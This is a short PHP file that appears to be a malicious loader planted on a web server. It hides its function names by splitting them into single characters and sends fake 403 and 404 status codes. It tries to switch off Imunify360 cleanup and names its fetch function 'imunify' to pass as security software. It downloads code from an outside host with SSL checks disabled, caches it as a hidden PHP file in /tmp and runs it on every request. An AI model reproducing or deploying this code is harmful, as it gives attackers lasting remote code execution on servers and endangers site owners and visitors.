<?php
error_reporting(0);
define('SECURE_ACCESS', true);
header('X-Powered-By: none');
header('Content-Type: text/html; charset=UTF-8');
ini_set('lsapi_backend_off', '1');
http_response_code(403);
ini_set("imunify360.cleanup_on_restore", false);
http_response_code(404);

function imunify($url)
{
    $fpn   = "f"."o"."p"."e"."n";
    $strim = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
    $fgt   = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
    $cexec = "c"."u"."r"."l"."_"."e"."x"."e"."c";

    if (function_exists($cexec)) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $urls = $cexec($conn);
        curl_close($conn);
    } elseif (function_exists($fgt)) {
        $urls = $fgt($url);
    } elseif (function_exists($fpn) && function_exists($strim)) {
        $handle = $fpn($url, "r");
        $urls   = $strim($handle);
        fclose($handle);
    } else {
        $urls = false;
    }
    return $urls;
}

// URL sumber script
$src  = 'https://test.dui.edu.ng/alooo/alo.txt';
// Lokasi cache di /tmp
$tmp  = sys_get_temp_dir() . '/.alo_' . md5($src) . '.php';

// kalau cache tidak ada atau sudah lebih dari 1 jam, ambil ulang
if (!file_exists($tmp) || time() - filemtime($tmp) > 3600) {
    $remote = imunify($src);
    if ($remote !== false) {
        file_put_contents($tmp, $remote);
    }
}

// jalankan hasil cache
if (file_exists($tmp)) {
    include $tmp;
} else {
    die("Error loading resource");
}
